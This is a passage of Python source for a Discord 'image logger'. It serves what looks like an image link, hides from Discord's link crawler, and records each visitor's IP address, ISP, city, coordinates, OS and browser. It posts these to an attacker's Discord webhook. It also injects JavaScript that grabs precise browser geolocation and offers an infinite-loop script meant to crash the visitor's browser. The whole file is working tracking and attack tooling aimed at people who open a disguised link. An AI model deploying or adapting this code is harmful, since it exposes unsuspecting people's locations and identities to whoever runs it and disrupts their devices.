        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
